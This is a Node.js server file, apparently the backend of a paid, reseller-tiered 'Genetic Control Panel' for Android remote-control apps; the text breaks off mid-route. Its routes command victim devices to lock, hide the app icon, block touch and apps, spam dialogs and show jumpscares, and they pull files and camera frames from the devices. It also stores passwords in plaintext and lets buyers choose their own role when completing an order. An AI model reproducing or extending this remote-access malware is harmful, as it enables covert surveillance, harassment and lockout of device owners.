// ================================================================
// server.js — Genetic Control Panel
// ================================================================
require('dotenv').config()

const express    = require('express')
const http       = require('http')
const { Server } = require('socket.io')
const path       = require('path')
const crypto     = require('crypto')
const fs         = require('fs')
const TelegramBot = require('node-telegram-bot-api')
const cron       = require('node-cron')
const archiver   = require('archiver')

// ================================================================
// ── App & Server Init ──────────────────────────────────────────
// ================================================================
const app    = express()
const server = http.createServer(app)
const io     = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
})

app.use(express.json())
app.use(express.static(path.join(__dirname, 'frontend')))

// ================================================================
// ── Environment Config ─────────────────────────────────────────
// ================================================================
const BOT_TOKEN          = process.env.BOT_TOKEN
const OWNER_ID           = parseInt(process.env.OWNER_ID)
const NOTIF_BOT_TOKEN    = process.env.NOTIF_BOT_TOKEN
const NOTIF_CHAT_ID      = parseInt(process.env.NOTIF_CHAT_ID)
const DIGITALPEDIA_API_KEY = process.env.DIGITALPEDIA_API_KEY
const DIGITALPEDIA_BASE  = process.env.DIGITALPEDIA_BASE || 'https://pay.digitalpedia.web.id'
const PORT               = process.env.PORT || 4000
const HOST               = process.env.HOST || '0.0.0.0'

// ================================================================
// ── Telegram Bots ─────────────────────────────────────────────
// ================================================================
const bot      = new TelegramBot(BOT_TOKEN, { polling: true })
const notifBot = new TelegramBot(NOTIF_BOT_TOKEN, { polling: false })

// ================================================================
// ── File Paths ─────────────────────────────────────────────────
// ================================================================
const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json')
const DEVICE_FILE   = path.join(__dirname, 'device.json')
const ORDERS_FILE   = path.join(__dirname, 'orders.json')
const HELPERS_FILE  = path.join(__dirname, 'helpers.json')
const BACKUP_DIR    = path.join(__dirname, 'backups')

// ================================================================
// ── Role Config ────────────────────────────────────────────────
// ================================================================
const ROLE_HIERARCHY = ['developer', 'owner', 'reseller', 'member']

const CAN_CREATE_ROLES = {
  developer: ['developer', 'owner', 'reseller', 'member'],
  owner:     ['reseller', 'member'],
  reseller:  ['member'],
  member:    []
}

const ROLE_QUOTA = {
  developer: { developer: Infinity, owner: Infinity, reseller: Infinity, member: Infinity },
  owner:     { reseller: 5, member: 300 },
  reseller:  { member: 110 }
}

const VISA_DEFAULT = {
  owner:    { reseller: 10, member: 60 },
  reseller: { member: 100 }
}

// ================================================================
// ── Product Prices ─────────────────────────────────────────────
// ================================================================
const PRODUCT_PRICES = {
  member:   25000,
  reseller: 70000,
  owner:    100000
}

const USERNAME_BLACKLIST = ['smooth', 'admin', 'owner', 'genetic']

// ================================================================
// ── In-Memory State ────────────────────────────────────────────
// ================================================================
const sessions           = {}
const devices            = {}
const cameraFrames       = {}
const controllerSockets  = new Set()
const pendingFileDownloads = {}

// ================================================================
// ── JSON File Helpers ──────────────────────────────────────────
// ================================================================
function initJsonFiles() {
  const defaults = {
    [ACCOUNTS_FILE]: '{}',
    [DEVICE_FILE]:   '{}',
    [ORDERS_FILE]:   '{}',
    [HELPERS_FILE]:  '{}'
  }
  for (const [filePath, def] of Object.entries(defaults)) {
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, def, 'utf8')
      console.log(`[INIT] File dibuat: ${path.basename(filePath)}`)
    }
  }
}

function loadJson(filePath) {
  try { return JSON.parse(fs.readFileSync(filePath, 'utf8')) } catch { return {} }
}

function saveJson(filePath, data) {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8')
}

const loadAccounts = () => loadJson(ACCOUNTS_FILE)
const saveAccounts = (d) => saveJson(ACCOUNTS_FILE, d)
const loadDevices  = () => loadJson(DEVICE_FILE)
const saveDevices  = (d) => saveJson(DEVICE_FILE, d)
const loadOrders   = () => loadJson(ORDERS_FILE)
const saveOrders   = (d) => saveJson(ORDERS_FILE, d)
const loadHelpers  = () => loadJson(HELPERS_FILE)
const saveHelpers  = (d) => saveJson(HELPERS_FILE, d)

// ================================================================
// ── Crypto Helpers ─────────────────────────────────────────────
// ================================================================
const genToken  = () => crypto.randomBytes(24).toString('hex')
const genUid    = () => crypto.randomBytes(16).toString('hex')
const genHex    = (n) => crypto.randomBytes(n).toString('hex')

// ================================================================
// ── Role Helpers ───────────────────────────────────────────────
// ================================================================
const roleIndex      = (role) => ROLE_HIERARCHY.indexOf(role)
const getAccountRole = (username) => loadAccounts()[username]?.role || 'member'

function getQuotaUsed(creatorUsername, targetRole) {
  return Object.values(loadAccounts()).filter(
    a => a.createdBy === creatorUsername && a.role === targetRole
  ).length
}

function getQuotaLimit(creatorUsername, targetRole) {
  const accounts = loadAccounts()
  const acc = accounts[creatorUsername]
  if (!acc) return 0
  const myRole = acc.role || 'member'
  if (myRole === 'developer') return Infinity
  const base = (ROLE_QUOTA[myRole] || {})[targetRole]
  if (base === undefined) return 0
  const visa = (acc.visa || {})[targetRole] || 0
  return base + visa
}

// ================================================================
// ── Trial / Expiry Helpers ─────────────────────────────────────
// ================================================================
function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null
  const now = new Date()
  const map = {
    '3m':  () => now.setMinutes(now.getMinutes() + 3),
    '5m':  () => now.setMinutes(now.getMinutes() + 5),
    '10m': () => now.setMinutes(now.getMinutes() + 10),
    '3d':  () => now.setDate(now.getDate() + 3),
    '7d':  () => now.setDate(now.getDate() + 7),
    '30d': () => now.setDate(now.getDate() + 30),
  }
  if (!map[duration]) return null
  map[duration]()
  return now.toISOString()
}

function deleteExpiredAccounts() {
  const accounts = loadAccounts()
  const now = new Date()
  let deleted = 0
  for (const [username, acc] of Object.entries(accounts)) {
    if (!acc.trialExpiry) continue
    if (new Date(acc.trialExpiry) <= now) {
      for (const [tok, sess] of Object.entries(sessions)) {
        if (sess.username === username) delete sessions[tok]
      }
      delete accounts[username]
      deleted++
      console.log(`\x1b[31m[TRIAL]\x1b[0m Akun "${username}" dihapus otomatis (expired)`)
    }
  }
  if (deleted > 0) saveAccounts(accounts)
}

setInterval(deleteExpiredAccounts, 60 * 1000)

// ================================================================
// ── Auth Middleware ────────────────────────────────────────────
// ================================================================
function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' })

  const username = sessions[token].username
  const accounts = loadAccounts()
  const acc = accounts[username]

  if (!acc) {
    delete sessions[token]
    return res.status(401).json({ error: 'Akun tidak ditemukan atau sudah dihapus' })
  }

  if (acc.trialExpiry && new Date(acc.trialExpiry) <= new Date()) {
    for (const [tok, sess] of Object.entries(sessions)) {
      if (sess.username === username) delete sessions[tok]
    }
    delete accounts[username]
    saveAccounts(accounts)
    console.log(`\x1b[31m[TRIAL]\x1b[0m Akun "${username}" dihapus saat request (expired)`)
    return res.status(401).json({ error: 'Akun trial kamu sudah berakhir dan telah dihapus' })
  }

  req.username = username
  req.uid      = sessions[token].uid
  next()
}

// ================================================================
// ── Notification Helpers ───────────────────────────────────────
// ================================================================
async function sendNotifAkunBaru(username, uid, createdBy, trialExpiry) {
  try {
    const expired = trialExpiry
      ? new Date(trialExpiry).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
      : 'Permanent'
    await notifBot.sendMessage(NOTIF_CHAT_ID,
      `✅ *AKUN BARU DIBUAT*\n\nUsername: \`${username}\`\nUID: \`${uid}\`\nExpired: ${expired}\nDibuat oleh: ${createdBy}`,
      { parse_mode: 'Markdown' }
    )
  } catch (e) { console.error('[NOTIF] Error:', e.message) }
}

async function sendNotifAkunHapus(username, deletedBy) {
  try {
    await notifBot.sendMessage(NOTIF_CHAT_ID,
      `🗑️ *AKUN DIHAPUS*\n\nUsername: \`${username}\`\nDihapus oleh: ${deletedBy}`,
      { parse_mode: 'Markdown' }
    )
  } catch (e) { console.error('[NOTIF] Error:', e.message) }
}

async function sendAccountsToBot() {
  try {
    await bot.sendDocument(OWNER_ID, ACCOUNTS_FILE, {}, {
      filename: 'accounts.json',
      contentType: 'application/json'
    })
    console.log('[BOT] accounts.json terkirim ke Telegram')
  } catch (e) { console.error('[BOT] Gagal kirim:', e.message) }
}

// ================================================================
// ── DigitalPedia Payment ───────────────────────────────────────
// ================================================================
async function postJson(url, body, timeout = 20000) {
  const ctrl = new AbortController()
  const t = setTimeout(() => ctrl.abort(), timeout)
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: { 'Content-Type': 'application/json', 'x-api-key': DIGITALPEDIA_API_KEY },
      body: JSON.stringify(body)
    })
    let data = {}
    try { data = await res.json() } catch {}
    if (!res.ok) throw new Error((data?.message || data?.error) || `HTTP ${res.status}`)
    return data
  } finally { clearTimeout(t) }
}

async function createQrisDigitalPedia({ amount }) {
  if (!DIGITALPEDIA_API_KEY || DIGITALPEDIA_API_KEY === 'YOUR_API_KEY')
    throw new Error('DIGITALPEDIA_API_KEY belum diisi')

  const data = await postJson(`${DIGITALPEDIA_BASE}/api/deposit/create`, { amount })
  if (!data.success) throw new Error(data.error || 'Failed to create deposit')

  const deposit = data.deposit
  console.log('[DIGITALPEDIA]', JSON.stringify(deposit))

  return {
    depositId: deposit.id,
    qrString:  deposit.qr_image,
    amount:    deposit.amount,
    fee:       deposit.fee,
    total:     deposit.total_payment,
    status:    deposit.status,
    expiresAt: deposit.expired_at
  }
}

async function checkStatusDigitalPedia({ depositId }) {
  if (!DIGITALPEDIA_API_KEY || DIGITALPEDIA_API_KEY === 'YOUR_API_KEY')
    throw new Error('DIGITALPEDIA_API_KEY belum diisi')

  const data = await postJson(`${DIGITALPEDIA_BASE}/api/deposit/status`, { deposit_id: depositId })
  if (!data.success) throw new Error(data.error || 'Failed to check status')

  return {
    status:  data.status,
    message: data.message,
    isPaid:  data.status === 'success'
  }
}

// ================================================================
// ── Socket Broadcast Helpers ───────────────────────────────────
// ================================================================
function broadcastToControllers(event, data, uid) {
  controllerSockets.forEach(sid => {
    const s = io.sockets.sockets.get(sid)
    if (!s) return
    if (s.data.smooth) {
      s.emit(event === 'devices:update' ? 'devices:update' : event,
        event === 'devices:update' ? getDeviceListForSmooth() : data)
      return
    }
    if (uid && s.data.uid !== uid) return
    s.emit(event, data)
  })
}

const broadcastToUid = (uid, event, data) => broadcastToControllers(event, data, uid)

function getDeviceListForSmooth() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name, uid: d.uid,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    info: d.info || {}, status: d.status
  }))
}

function getDeviceListForUid(uid) {
  if (!uid) return []
  return Object.values(devices)
    .filter(d => d.uid === uid)
    .map(d => ({
      id: d.id, name: d.name,
      connectedAt: d.connectedAt, lastSeen: d.lastSeen,
      info: d.info || {}, status: d.status
    }))
}

// ================================================================
// ── Backup System ──────────────────────────────────────────────
// ================================================================
// ========== AUTO BACKUP ==========
// FIX: sebelumnya daftar file di-hardcode dan ketinggalan zaman (banyak file json
// baru kayak group_reads.json, dm_chats.json, ai_chats.json, sessions.json, dll
// nggak ikut ke-backup). Sekarang scan otomatis SEMUA .json di folder data/ dan
// setting/, jadi file baru ke depannya otomatis ikut ter-backup tanpa perlu edit
// baris ini lagi.
// ================================================================
// ── Backup System ──────────────────────────────────────────────
// ================================================================
cron.schedule('0 * * * *', () => {
  if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true });

  const timestamp = new Date().toISOString().replace(/:/g, '-');
  const zipPath   = path.join(BACKUP_DIR, `backup-${timestamp}.zip`);
  const output    = fs.createWriteStream(zipPath);
  const archive   = archiver('zip', { zlib: { level: 9 } });

  output.on('close', async () => {
    const sizeKB = (archive.pointer() / 1024).toFixed(2);
    try {
      await bot.sendDocument(OWNER_ID, zipPath, {
        caption: `📦 *Auto Backup*\n\nFile: backup-${timestamp}.zip\nUkuran: ${sizeKB} KB`,
        parse_mode: 'Markdown'
      });
      console.log(`[BACKUP] Terkirim ke Telegram (${sizeKB} KB)`);
    } catch (e) {
      console.error('[BACKUP] Gagal kirim:', e.message);
    }
  });

  archive.on('error', (err) => console.error('[BACKUP] Archive error:', err));
  archive.pipe(output);

  // Semua *.json di root folder (accounts, devices, orders, helpers)
  [ACCOUNTS_FILE, DEVICE_FILE, ORDERS_FILE, HELPERS_FILE].forEach(f => {
    if (fs.existsSync(f)) archive.file(f, { name: path.basename(f) });
  });

  archive.finalize();
});



// ================================================================
// ── Routes: Static Pages ───────────────────────────────────────
// ================================================================
app.get('/',          (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'iklan.html')))
app.get('/order',     (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'order.html')))
app.get('/adminpanel',(req, res) => res.sendFile(path.join(__dirname, 'frontend', 'adminpanel.html')))
app.get('/helper',    (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'helper.html')))

app.get('/produk/:filename', (req, res) => {
  const filepath = path.join(__dirname, 'produk', req.params.filename)
  if (!fs.existsSync(filepath)) return res.status(404).send('File tidak ditemukan')
  res.sendFile(filepath)
})

// ================================================================
// ── Routes: Auth ──────────────────────────────────────────────
// ================================================================
app.post('/api/login', (req, res) => {
  const { username, password, deviceId } = req.body
  if (!username || !password)
    return res.status(400).json({ error: 'Username Dan Password Wajib Diisi' })

  const accounts = loadAccounts()
  const acc = accounts[username]
  if (!acc || acc.password !== password)
    return res.status(401).json({ error: 'Username Atau Password Salah' })

  if (!acc.uid) {
    acc.uid = genUid()
    accounts[username] = acc
    saveAccounts(accounts)
  }

  const devs = loadDevices()
  if (devs[username] && devs[username] !== deviceId)
    return res.status(403).json({ error: 'Akun ini sudah digunakan di perangkat lain' })

  devs[username] = deviceId
  saveDevices(devs)

  const token = genToken()
  sessions[token] = { username, uid: acc.uid }
  res.json({ ok: true, token, username: acc.displayName || username })
})

app.post('/api/logout', requireAuth, (req, res) => {
  delete sessions[req.headers['x-auth-token']]
  res.json({ ok: true })
})

app.get('/api/me', requireAuth, (req, res) => {
  const acc = loadAccounts()[req.username]
  if (!acc) return res.status(404).json({ error: 'Account not found' })
  res.json({
    username:    req.username,
    displayName: acc.displayName || req.username,
    role:        acc.role || 'member',
    uid:         acc.uid || '',
    trialExpiry: acc.trialExpiry || null
  })
})

app.post('/api/change-password', requireAuth, (req, res) => {
  const { oldPassword, newPassword } = req.body
  if (!oldPassword || !newPassword)
    return res.status(400).json({ error: 'Semua field wajib diisi' })
  if (newPassword.length < 6)
    return res.status(400).json({ error: 'Password baru minimal 6 karakter' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc) return res.status(404).json({ error: 'Akun tidak ditemukan' })
  if (acc.password !== oldPassword)
    return res.status(401).json({ error: 'Password lama salah' })

  acc.password = newPassword
  saveAccounts(accounts)
  res.json({ ok: true })
})

// ================================================================
// ── Routes: Devices & Commands ────────────────────────────────
// ================================================================
app.get('/api/devices', requireAuth, (req, res) => {
  const acc = loadAccounts()[req.username]
  res.json(acc?.smooth ? getDeviceListForSmooth() : getDeviceListForUid(req.uid))
})

app.post('/api/command/:deviceId', requireAuth, (req, res) => {
  const { deviceId }        = req.params
  const { command, value }  = req.body

  if (!devices[deviceId]) return res.status(404).json({ error: 'Device Not Found' })

  const acc = loadAccounts()[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const uid = req.uid || devices[deviceId]?.uid || ''
  const st  = devices[deviceId].status
  const broadcast = () => broadcastToUid(uid, 'devices:update', getDeviceListForUid(uid))

  const statusMap = {
    lockDevice:       () => { try { const p = typeof value === 'string' ? JSON.parse(value) : value; st.deviceLocked = true; st.lockTitle = p.title || '' } catch {} },
    unlockDevice:     () => { st.deviceLocked = false; st.lockTitle = '' },
    hideIcon:         () => { st.iconHidden = value === 'true' },
    touchBlock:       () => { st.touchBlocked = true },
    touchBlockStop:   () => { st.touchBlocked = false },
    ttsSpeak:         () => { st.ttsSpeaking = true },
    ttsStop:          () => { st.ttsSpeaking = false },
    videoOverlay:     () => { st.videoOverlayActive = true },
    videoOverlayHide: () => { st.videoOverlayActive = false },
    muteVolume:       () => { st.volumeMuted = value === 'true' },
    jumpscareStart:   () => { st.jumpscareActive = true; st.jumpscareUrl = value },
    jumpscareStop:    () => { st.jumpscareActive = false },
    jumpscare2Start:  () => { try { const o = typeof value === 'string' ? JSON.parse(value) : value; st.jumpscare2Active = true; st.jumpscare2Url = o.url || ''; st.jumpscare2Duration = o.duration || 3000 } catch {} },
    jumpscare2Stop:   () => { st.jumpscare2Active = false },
    dialogSpam:       () => { st.dialogSpamActive = true },
    dialogSpamStop:   () => { st.dialogSpamActive = false },
    blockApp:         () => { try { const o = typeof value === 'string' ? JSON.parse(value) : value; const arr = st.blockedApps || []; if (!arr.includes(o.package)) arr.push(o.package); st.blockedApps = arr } catch {} },
    unblockApp:       () => { st.blockedApps = (st.blockedApps || []).filter(p => p !== value) },
    unblockAll:       () => { st.blockedApps = [] }
  }

  if (statusMap[command]) { statusMap[command](); broadcast() }

  io.to(`device:${deviceId}`).emit('command', { command, value })
  res.json({ ok: true })
})

app.get('/api/screenshot/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const acc = loadAccounts()[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const frame = cameraFrames[deviceId]
  if (!frame) return res.status(404).json({ error: 'Belum ada frame. Nyalakan Live Camera dulu!' })
  res.json({ ok: true, frame, deviceId })
})

app.get('/api/file/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  const filePath = req.query.path
  if (!filePath) return res.status(400).json({ error: 'path diperlukan' })
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const acc = loadAccounts()[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const reqId    = genHex(8)
  const filename = filePath.split('/').pop() || 'file'
  let settled    = false

  pendingFileDownloads[reqId] = (err, buf, mime) => {
    if (settled) return
    settled = true
    delete pendingFileDownloads[reqId]
    if (err) return res.status(500).json({ error: err })
    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`)
    res.setHeader('Content-Type', mime || 'application/octet-stream')
    res.send(buf)
  }

  io.to(`device:${deviceId}`).emit('command', {
    command: 'downloadFile',
    value: JSON.stringify({ path: filePath, reqId })
  })

  setTimeout(() => {
    if (pendingFileDownloads[reqId])
      pendingFileDownloads[reqId]('Timeout: device tidak merespons')
  }, 30000)
})

// ================================================================
// ── Routes: Admin ─────────────────────────────────────────────
// ================================================================
app.get('/api/admin/quota', requireAuth, (req, res) => {
  const myRole = getAccountRole(req.username)
  if (myRole === 'developer') return res.json({ unlimited: true })

  const result = {}
  ;(CAN_CREATE_ROLES[myRole] || []).forEach(targetRole => {
    const limit = getQuotaLimit(req.username, targetRole)
    const used  = getQuotaUsed(req.username, targetRole)
    result[targetRole] = { used, limit, remaining: limit - used }
  })
  res.json({ unlimited: false, quota: result })
})

app.post('/api/admin/create-account', requireAuth, async (req, res) => {
  const myRole = getAccountRole(req.username)
  const { username, password, role, trialDuration } = req.body

  if (!username || !password || !role)
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' })

  if (!['developer', 'owner', 'reseller'].includes(myRole))
    return res.status(403).json({ error: 'Hanya developer, owner, dan reseller yang bisa membuat akun' })

  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!allowed.includes(role))
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat akun dengan role "${role}"` })

  if (myRole !== 'developer') {
    const limit = getQuotaLimit(req.username, role)
    const used  = getQuotaUsed(req.username, role)
    if (used >= limit)
      return res.status(403).json({ error: `Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${role}"` })
  }

  let validDurations
  if (role === 'member') {
    if      (myRole === 'developer') validDurations = ['3m', '5m', '10m', '3d', '7d', '30d', 'permanent']
    else if (myRole === 'reseller')  validDurations = ['permanent']
    else                             validDurations = ['3d', '7d', '30d', 'permanent']
  } else {
    if (trialDuration && trialDuration !== 'permanent')
      return res.status(400).json({ error: `Akun role "${role}" hanya bisa permanent` })
    validDurations = ['permanent']
  }

  const finalDuration = trialDuration || 'permanent'
  if (!validDurations.includes(finalDuration))
    return res.status(400).json({ error: `trialDuration tidak valid. Opsi: ${validDurations.join(', ')}` })

  const key = username.trim()
  if (!key || key.length < 3)
    return res.status(400).json({ error: 'Username minimal 3 karakter' })

  const accounts = loadAccounts()
  if (accounts[key]) return res.status(409).json({ error: `Akun "${username}" sudah ada` })

  const newUid      = genUid()
  const trialExpiry = getTrialExpiry(finalDuration)

  accounts[key] = {
    password:      password,
    displayName:   key,
    role:          role,
    uid:           newUid,
    createdBy:     req.username,
    createdAt:     new Date().toISOString(),
    trialDuration: finalDuration,
    trialExpiry:   trialExpiry
  }
  saveAccounts(accounts)

  const label = finalDuration === 'permanent' ? 'Permanent' : `Trial ${finalDuration}`
  console.log(`\x1b[36m[ADMIN]\x1b[0m Akun baru: ${key} (${role}) [${label}] oleh ${req.username}`)
  await sendNotifAkunBaru(key, newUid, req.username, trialExpiry)

  res.json({ ok: true, uid: newUid, username: key, displayName: key, role, trialDuration: finalDuration, trialExpiry })
})

app.get('/api/admin/accounts', requireAuth, (req, res) => {
  const myRole   = getAccountRole(req.username)
  const accounts = loadAccounts()
  const myIdx    = roleIndex(myRole)

  const list = Object.entries(accounts)
    .filter(([uname, acc]) => {
      if (myRole === 'developer') return true
      return roleIndex(acc.role || 'member') >= myIdx || uname === req.username
    })
    .map(([username, acc]) => ({
      username,
      displayName:   acc.displayName || username,
      role:          acc.role || 'member',
      uid:           acc.uid || '-',
      createdBy:     acc.createdBy || '-',
      createdAt:     acc.createdAt || null,
      trialDuration: acc.trialDuration || 'permanent',
      trialExpiry:   acc.trialExpiry || null
    }))
    .sort((a, b) => roleIndex(a.role) - roleIndex(b.role))

  res.json(list)
})

app.delete('/api/admin/accounts/:username', requireAuth, async (req, res) => {
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()

  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa menghapus akun sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser]) return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  if (roleIndex(myRole) >= roleIndex(targetRole))
    return res.status(403).json({ error: `Role "${myRole}" tidak bisa menghapus akun role "${targetRole}"` })

  delete accounts[targetUser]
  saveAccounts(accounts)

  const devs = loadDevices()
  delete devs[targetUser]
  saveDevices(devs)

  let kicked = 0
  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === targetUser) { delete sessions[tok]; kicked++ }
  }

  console.log(`\x1b[33m[ADMIN]\x1b[0m Dihapus: ${targetUser} (${targetRole}) oleh ${req.username}, kicked: ${kicked}`)
  await sendNotifAkunHapus(targetUser, req.username)
  res.json({ ok: true, kicked })
})

app.patch('/api/admin/accounts/:username/role', requireAuth, (req, res) => {
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()
  const { role: newRole } = req.body

  if (!newRole || !ROLE_HIERARCHY.includes(newRole))
    return res.status(400).json({ error: 'Role tidak valid' })
  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa mengubah role sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser]) return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx      = roleIndex(myRole)

  if (myIdx >= roleIndex(targetRole) || myIdx >= roleIndex(newRole))
    return res.status(403).json({ error: 'Tidak punya izin mengubah role ini' })

  accounts[targetUser].role = newRole
  saveAccounts(accounts)

  console.log(`\x1b[36m[ADMIN]\x1b[0m Role diubah: ${targetUser} ${targetRole}→${newRole} oleh ${req.username}`)
  res.json({ ok: true, username: targetUser, oldRole: targetRole, newRole })
})

app.get('/api/admin/orders', requireAuth, (req, res) => {
  if (!['developer', 'owner'].includes(getAccountRole(req.username)))
    return res.status(403).json({ error: 'Akses ditolak' })
  const orders = loadOrders()
  res.json(Object.entries(orders).map(([id, o]) => ({ invoice_id: id, ...o })))
})

app.get('/api/admin/helpers', requireAuth, (req, res) => {
  if (!['developer', 'owner'].includes(getAccountRole(req.username)))
    return res.status(403).json({ error: 'Akses ditolak' })
  const helpers = loadHelpers()
  res.json(Object.entries(helpers).map(([id, h]) => ({ invoice_id: id, ...h })))
})

// ================================================================
// ── Routes: Orders (Payment) ───────────────────────────────────
// ================================================================
app.post('/api/order/create', async (req, res) => {
  const { role, username, password } = req.body

  if (!role || !username || !password)
    return res.status(400).json({ success: false, error: 'role, username, password wajib diisi' })

  const amount = PRODUCT_PRICES[role]
  if (!amount)
    return res.status(400).json({ success: false, error: `Role "${role}" tidak valid` })

  if (USERNAME_BLACKLIST.includes(username.toLowerCase()))
    return res.status(400).json({ success: false, error: `Username "${username}" tidak diizinkan` })

  const accounts = loadAccounts()
  if (accounts[username.toLowerCase()])
    return res.status(409).json({ success: false, error: `Username "${username}" sudah digunakan` })

  const orderId = `ORD-${Date.now()}-${genHex(4).toUpperCase()}`

  try {
    const qris = await createQrisDigitalPedia({ amount })

    const orders = loadOrders()
    orders[orderId] = {
      role, username, password, amount,
      status:     'pending',
      deposit_id: qris.depositId,
      createdAt:  new Date().toISOString(),
      expiresAt:  qris.expiresAt
    }
    saveOrders(orders)

    console.log(`\x1b[36m[ORDER]\x1b[0m Dibuat: ${orderId} | ${role} | Rp ${amount.toLocaleString('id-ID')}`)
    res.json({ success: true, invoice_id: orderId, deposit_id: qris.depositId, amount, fee: qris.fee, total_payment: qris.total, qr_image: qris.qrString, expires_at: qris.expiresAt })
  } catch (e) {
    console.error('[ORDER] Error:', e.message)
    res.status(500).json({ success: false, error: `Gagal membuat QRIS: ${e.message}` })
  }
})

app.get('/api/order/status/:invoiceId', async (req, res) => {
  const orders = loadOrders()
  const order  = orders[req.params.invoiceId]

  if (!order) return res.status(404).json({ status: 'not_found', error: 'Invoice tidak ditemukan' })

  if (order.status === 'pending' && new Date(order.expiresAt) <= new Date()) {
    order.status = 'expired'
    saveOrders(orders)
    return res.json({ status: 'expired', invoice_id: req.params.invoiceId })
  }

  try {
    const status = await checkStatusDigitalPedia({ depositId: order.deposit_id })
    if (status.isPaid)              { order.status = 'paid';    order.paidAt = new Date().toISOString() }
    else if (status.status === 'expired') { order.status = 'expired' }
    saveOrders(orders)
    res.json({ status: order.status, invoice_id: req.params.invoiceId, amount: order.amount, role: order.role, message: status.message })
  } catch (e) {
    console.error('[ORDER] Check status error:', e.message)
    res.status(500).json({ status: 'error', error: `Gagal cek status: ${e.message}` })
  }
})

app.post('/api/order/complete', async (req, res) => {
  const { invoice_id, username, password, role } = req.body
  if (!invoice_id || !username || !password || !role)
    return res.status(400).json({ success: false, error: 'Data tidak lengkap' })

  const orders = loadOrders()
  const order  = orders[invoice_id]
  if (!order)               return res.status(404).json({ success: false, error: 'Invoice tidak ditemukan' })
  if (order.status !== 'paid') return res.status(400).json({ success: false, error: 'Pembayaran belum dikonfirmasi' })

  const accounts = loadAccounts()
  const key = username.toLowerCase()
  if (accounts[key]) return res.status(409).json({ success: false, error: `Username "${username}" sudah digunakan` })

  const newUid = genUid()
  accounts[key] = {
    password, displayName: username, role, uid: newUid,
    createdBy:     `order_${invoice_id}`,
    createdAt:     new Date().toISOString(),
    trialDuration: 'permanent',
    trialExpiry:   null
  }
  saveAccounts(accounts)

  order.status = 'completed'
  order.completedAt = new Date().toISOString()
  order.createdUsername = username
  saveOrders(orders)

  console.log(`\x1b[32m[ORDER]\x1b[0m Akun dibuat: ${username} (${role}) dari ${invoice_id}`)

  try {
    await bot.sendMessage(OWNER_ID,
      `✅ *ORDER COMPLETED*\n\nInvoice: ${invoice_id}\nUsername: ${username}\nRole: ${role}\nHarga: Rp ${order.amount.toLocaleString('id-ID')}`,
      { parse_mode: 'Markdown' }
    )
  } catch (e) { console.error('[BOT] Gagal notifikasi:', e.message) }

  const apkFiles = ['kontrol.apk', 'stum.apk'].filter(f =>
    fs.existsSync(path.join(__dirname, 'produk', f))
  )

  res.json({ success: true, username, password, role, uid: newUid, apk_files: apkFiles })
})

// ================================================================
// ── Routes: Helper (Device Cache Clear) ───────────────────────
// ================================================================
app.post('/api/helper/create', async (req, res) => {
  const { username, amount } = req.body

  if (!username || username.length < 3)
    return res.status(400).json({ success: false, error: 'Username minimal 3 karakter' })

  const accounts = loadAccounts()
  if (!accounts[username.toLowerCase()])
    return res.status(404).json({ success: false, error: `Username "${username}" tidak ditemukan` })

  const orderId = `HLP-${Date.now()}-${genHex(4).toUpperCase()}`

  try {
    const qris = await createQrisDigitalPedia({ amount })

    const helpers = loadHelpers()
    helpers[orderId] = {
      username, amount,
      status:     'pending',
      deposit_id: qris.depositId,
      createdAt:  new Date().toISOString(),
      expiresAt:  qris.expiresAt
    }
    saveHelpers(helpers)

    console.log(`\x1b[36m[HELPER]\x1b[0m Dibuat: ${orderId} | ${username} | Rp ${amount.toLocaleString('id-ID')}`)
    res.json({ success: true, invoice_id: orderId, deposit_id: qris.depositId, amount, fee: qris.fee, total_payment: qris.total, qr_image: qris.qrString, expires_at: qris.expiresAt })
  } catch (e) {
    console.error('[HELPER] Error:', e.message)
    res.status(500).json({ success: false, error: `Gagal membuat QRIS: ${e.message}` })
  }
})

app.get('/api/helper/status/:invoiceId', async (req, res) => {
  const helpers = loadHelpers()
  const helper  = helpers[req.params.invoiceId]
  if (!helper) return res.status(404).json({ status: 'not_found', error: 'Invoice tidak ditemukan' })

  if (helper.status === 'pending' && new Date(helper.expiresAt) <= new Date()) {
    helper.status = 'expired'
    saveHelpers(helpers)
